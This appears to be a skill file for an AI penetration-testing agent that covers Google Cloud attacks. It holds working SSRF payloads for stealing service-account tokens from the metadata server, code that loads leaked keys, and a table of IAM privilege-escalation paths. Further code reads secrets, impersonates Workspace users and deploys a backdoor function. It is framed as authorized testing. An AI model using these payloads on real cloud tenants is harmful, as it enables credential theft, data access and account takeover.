---
name: GCP Pentesting
description: Reference for Google Cloud Platform attacks covering service-account token theft, IAM role-chain, GCS public bucket abuse, GCP metadata server, OAuth scope abuse, and Cloud Functions / Cloud Run misconfigurations.
---

# GCP Pentesting

Reference for testing Google Cloud Platform targets. Pull this in when the target runs on GCE / GKE / Cloud Run / Cloud Functions / App Engine, uses Workspace identity, or you have GCP service-account JSON keys / OAuth tokens.

> Black-box scope: probes drive GCP REST APIs via `google-auth` + `google-api-python-client` (now installed). The `gcloud` CLI is NOT in the image; the Python SDKs cover every probe.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Programmatic GCP API | `execute_code` | `google-auth` + `google-api-python-client`; service-account JSON or OAuth token. |
| Storage probes | `execute_code` | `google-cloud-storage`. |
| OAuth flow capture | `execute_playwright` | Drive consent / device-code flows. |
| GCE metadata abuse | `execute_curl` | `http://metadata.google.internal/...` with `Metadata-Flavor: Google` header. |
| JWT triage | `kali_shell jwt_tool` + `/skill jwt_attacks` |  |

## Recon: pre-credential

### Project enumeration

GCP project IDs are global and DNS-resolvable. Enumerate via:

```python
execute_code language: python
import requests
candidates = ["target", "target-prod", "target-dev", "target-staging",
              "target-data", "target-api", "company-target"]
for p in candidates:
    r = requests.get(f"https://storage.googleapis.com/storage/v1/b?project={p}", timeout=5)
    # 200 / 401 / 403 = project exists; 404 = doesn't
    print(p, r.status_code)
```

Endpoint patterns leaking project IDs:

```
https://<project>.appspot.com/                          (App Engine)
https://<project>.web.app                               (Firebase Hosting)
https://<region>-<project>.cloudfunctions.net/<fn>      (Cloud Functions)
https://<service>-<hash>-<region>.a.run.app              (Cloud Run)
https://storage.googleapis.com/<bucket>/                 (GCS, bucket name often = project name)
```

### TLS cert SAN

`*.appspot.com`, `*.googleusercontent.com`, `*.googleapis.com`, `<region>-<project>.cloudfunctions.net`.

## Metadata Server (GCE / GKE / Cloud Run / Cloud Functions)

Available at `http://metadata.google.internal` (or `169.254.169.254`). Header `Metadata-Flavor: Google` is REQUIRED on every request -- a mitigation against naive SSRF.

```
GET http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true
  Header: Metadata-Flavor: Google
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Header: Metadata-Flavor: Google
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=<aud>
  Header: Metadata-Flavor: Google
```

Token response:

```json
{"access_token":"ya29.A0...","expires_in":3599,"token_type":"Bearer"}
```

Token scope is determined by what scopes the SA token is bound to (`scopes` field in `instance/service-accounts/default/scopes`).

### SSRF probes

```
execute_curl url: "https://target.tld/api/preview?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Header trick: many SSRF endpoints can't inject Metadata-Flavor: Google
# Workaround attempts:
execute_curl url: "https://target.tld/api/preview?url=http://metadata/computeMetadata/v1/?alt=json"
execute_curl url: "https://target.tld/api/preview?url=http://[fd00::]/computeMetadata/v1/"
execute_curl url: "https://target.tld/api/preview?url=http://metadata.google.internal:80/computeMetadata/v1beta1/instance/service-accounts/default/token"
# v1beta1 sometimes does NOT require the Metadata-Flavor header
```

The legacy `v1beta1` endpoint relaxes the header requirement on some configurations -- a known SSRF-friendly path.

## Authentication: capturing tokens

| Method | How |
|---|---|
| Service-account JSON | File-based key with `private_key`, `client_email`, etc. |
| OAuth user token | Refresh tokens from leaked `~/.config/gcloud/credentials.db` or browser flows |
| Workload Identity (GKE) | Pod-injected token via metadata server |
| Compute Engine default SA | Metadata-server token bound to the VM's SA |
| Cloud Functions / Cloud Run | Same as GCE metadata; token is the function's runtime SA |
| Identity Token (JWT) | `audience`-scoped, used for service-to-service auth |

```python
execute_code language: python
from google.oauth2 import service_account, credentials
# From service-account JSON:
creds = service_account.Credentials.from_service_account_file(
    "/tmp/sa.json",
    scopes=["https://www.googleapis.com/auth/cloud-platform"])

# From OAuth user (refresh token):
import json
data = json.load(open("/tmp/user_creds.json"))
ucreds = credentials.Credentials(
    None, refresh_token=data["refresh_token"],
    client_id=data["client_id"], client_secret=data["client_secret"],
    token_uri="https://oauth2.googleapis.com/token")
ucreds.refresh(__import__("google.auth.transport.requests", fromlist=["Request"]).Request())
print(ucreds.token[:40], "...")
```

## IAM enumeration

```python
execute_code language: python
from googleapiclient import discovery
crm = discovery.build("cloudresourcemanager", "v3", credentials=creds)
iam = discovery.build("iam", "v1", credentials=creds)

# What projects can I see?
print(crm.projects().search().execute())

# IAM policy on a project
proj = "<project-id>"
policy = crm.projects().getIamPolicy(resource=f"projects/{proj}", body={}).execute()
print(policy)

# Test which permissions I have (canonical "least-noisy" enumeration)
test = crm.projects().testIamPermissions(
    resource=f"projects/{proj}",
    body={"permissions":[
        "iam.serviceAccountKeys.create",
        "iam.serviceAccounts.actAs",
        "compute.instances.create",
        "storage.buckets.list",
        "secretmanager.secrets.access",
        "cloudfunctions.functions.create",
        "cloudfunctions.functions.update",
        "iam.serviceAccounts.getAccessToken",
        "iam.serviceAccounts.signJwt",
    ]}).execute()
print(test)
```

`testIamPermissions` is the canonical low-noise way to discover what you can actually do.

### Privilege escalation paths

| If you have | Escalate via |
|---|---|
| `iam.serviceAccountKeys.create` | Mint a fresh JSON key for any SA in the project |
| `iam.serviceAccounts.getAccessToken` | Generate a token for any SA you can `actAs` |
| `iam.serviceAccounts.signJwt` | Sign an ID token for any SA |
| `iam.serviceAccounts.implicitDelegation` | Chain SA -> SA -> SA token grants |
| `iam.serviceAccounts.actAs` + `cloudfunctions.functions.create` | Deploy a function with attached SA, run as that SA |
| `iam.serviceAccounts.actAs` + `compute.instances.create` | Same, with attached SA |
| `iam.serviceAccounts.actAs` + `cloudbuild.builds.create` | Cloud Build runs as the configured SA |
| `cloudfunctions.functions.update` | Replace existing function code; run as its current SA |
| `compute.instances.setMetadata` | Set startup-script metadata on an existing instance with broad SA |
| `iam.roles.update` | Update a custom role to add admin permissions |
| `serviceusage.services.use` (with service account permissions) | Some service-specific privesc paths |
| `secretmanager.secrets.access` | Read secrets that may include credentials for higher SAs |

The canonical reference is Rhino Security Labs' "GCP Privilege Escalation" series (40+ documented paths).

## GCS (Cloud Storage)

### Anonymous reads

```
GET https://storage.googleapis.com/<bucket>/                     (list, when public)
GET https://storage.googleapis.com/<bucket>/<object>              (read)
GET https://storage.googleapis.com/storage/v1/b/<bucket>/o        (list via JSON API)
```

### Probe template

```python
execute_code language: python
import requests
candidates = ["target","target-backup","target-prod","target-static","target-uploads"]
for c in candidates:
    r = requests.get(f"https://storage.googleapis.com/{c}/", timeout=5)
    print(c, r.status_code)
```

| Status | Meaning |
|---|---|
| 200 | Bucket public |
| 401 / 403 | Bucket exists, requires auth |
| 404 | Bucket doesn't exist |

### Bucket policy probe

```python
from google.cloud import storage
client = storage.Client(credentials=creds, project=proj)
b = client.bucket("<bucket-name>")
print(b.iam_policy().bindings)
print(b.acl)
```

Common bad bindings:

- `members: ["allUsers"]` on `roles/storage.objectViewer` -> public reads.
- `members: ["allAuthenticatedUsers"]` -> any logged-in Google account reads.
- `members: ["allUsers"]` on `roles/storage.objectAdmin` -> public writes (catastrophic).

### Signed URL replay

GCS signed URLs include `X-Goog-Signature` and an expiry. Capture from logs / proxies; replay until `X-Goog-Date + X-Goog-Expires` passes. Long expiry windows (>1 hour) are a finding.

## Compute Engine

```python
compute = discovery.build("compute","v1", credentials=creds)
print(compute.instances().list(project=proj, zone="us-central1-a").execute())
```

Per-instance findings:

- `metadata` field with embedded credentials (cloud-init scripts, `gcloud auth list` cached state).
- `serviceAccounts` showing the attached SA + scope (`https://www.googleapis.com/auth/cloud-platform` = full project access).
- `tags.items` revealing firewall-rule targets (often hint at internal services).
- Disk attachments named after secrets / backups.

## Cloud Functions / Cloud Run

```python
functions = discovery.build("cloudfunctions","v1", credentials=creds)
print(functions.projects().locations().functions().list(
    parent=f"projects/{proj}/locations/-").execute())
```

Per-function findings:

- `environmentVariables`: secrets in plaintext.
- `httpsTrigger.url` + `ingressSettings: ALLOW_ALL`: publicly invokable.
- `serviceAccountEmail`: which SA the function runs as.
- `availableMemoryMb`, `runtime`, etc. for fingerprinting.

For Cloud Run:

```python
run = discovery.build("run","v1", credentials=creds)
print(run.namespaces().services().list(parent=f"namespaces/{proj}").execute())
```

## Secret Manager

```python
sm = discovery.build("secretmanager","v1", credentials=creds)
print(sm.projects().secrets().list(parent=f"projects/{proj}").execute())
print(sm.projects().secrets().versions().access(
    name=f"projects/{proj}/secrets/<name>/versions/latest").execute())
```

Decoded `payload.data` is the secret. With `secretmanager.secrets.access`, every secret is readable.

## GKE (Kubernetes)

```python
container = discovery.build("container","v1", credentials=creds)
print(container.projects().locations().clusters().list(
    parent=f"projects/{proj}/locations/-").execute())
```

Per-cluster:

- `endpoint`: the API server IP.
- `masterAuth.clusterCaCertificate`: trust anchor for kubectl.
- `nodeConfig.serviceAccount`: the node SA (often default Compute SA, broad permissions).
- `legacyAbac.enabled`: legacy ABAC = wide auth.

For pod-side container escape, see `/skill docker_escape`. For Kubernetes-specific abuse (cluster-side), the dedicated K8s community skill (Tier 4 #35) covers it.

## Workspace integration (Google Workspace)

When the target is a Workspace tenant, GCP IAM and Workspace IAM are linked:

- Domain-wide delegation: a service account with DWD can impersonate ANY user in the Workspace domain.
- Drive / Gmail / Calendar APIs accessible as impersonated user.

```python
from google.oauth2 import service_account
SUBJECT = "victim@target.tld"
delegated = service_account.Credentials.from_service_account_file(
    "/tmp/sa.json", scopes=["https://www.googleapis.com/auth/drive.readonly"]
).with_subject(SUBJECT)
# Use delegated to read victim's Drive
```

DWD is a critical-impact finding when discovered.

## Validation shape

A clean GCP finding includes:

1. The credential source (metadata server abuse, leaked SA JSON, OAuth phish, etc.).
2. The principal: `gcloud auth list`-equivalent output (`crm.projects.testIamPermissions` results).
3. The project ID and any cross-project access discovered.
4. The specific resource (bucket, function, secret, instance).
5. For privesc: the chain (e.g. `iam.serviceAccounts.actAs` + `cloudfunctions.update` -> deploy backdoor function -> mint SA token).
6. Sample of leaked data (one secret, one bucket object).

## False positives

- Metadata server reachable but the SA has zero permissions.
- GCS bucket "exists" (403 on read) but the IAM policy is genuinely tight.
- IAM testIamPermissions returns nothing: token has zero permissions.
- Cluster API endpoint reachable but `masterAuthorizedNetworks` restricts callers to admin IPs.
- DWD configured but only on a narrow scope set.

## Tooling status

The brief lists `scoutsuite-gcp`, `ggshield`, `gcp_enum`, `gcloud CLI` as missing. The agent uses `google-auth` + `google-api-python-client` + `google-cloud-storage` (now installed) for every probe. ScoutSuite's findings can be reproduced via the Python SDK calls above; specific GCP CIS-benchmark checks live in their open ruleset.

## Hand-off

```
Metadata-server token captured     -> IAM enumeration via this skill
Public GCS bucket                   -> /skill information_disclosure
Cloud Function env vars             -> /skill information_disclosure
Workspace DWD discovered            -> escalate; full Workspace impersonation
JWT issued by Cloud Identity        -> /skill jwt_attacks
GKE pod foothold                    -> /skill docker_escape -> back to GCP via metadata
On-prem connection (Cloud VPN)      -> network pivot to internal targets
```

## Pro tips

- The first probe on a captured token is `crm.projects.testIamPermissions` with a curated permission list. It is low-noise and reveals the entire viable attack surface.
- The Compute default SA (`<project-num>-compute@developer.gserviceaccount.com`) often has Editor on the project, which is effectively admin for most purposes. Compromise of any GCE VM tends to compromise the project.
- Domain-wide delegation is silent: there is no UI alert when an SA impersonates a user. Audit logs do record it, but real-time detection is rare.
- `iam.serviceAccounts.actAs` is the master privesc primitive on GCP. Combined with any `*.create` permission on a service that supports SA attachment, it gives token minting for the target SA.
- Cloud Functions HTTPS triggers with `ingressSettings: ALLOW_ALL` and `--allow-unauthenticated` are publicly invokable; many teams forget to lock these down.
- Service-account JSON keys leak in source code, public buckets, container images, and CI artifacts. `betterleaks` patterns include the `private_key` field; always scan recovered repos.
- `gcloud auth print-access-token` (when run from a compromised workstation) leaks the user's OAuth token; same effect as a service-account JSON.
- The `metadata.google.internal` hostname requires the `Metadata-Flavor: Google` header on most paths. The `v1beta1` endpoint sometimes relaxes this -- a known SSRF-friendly fallback.
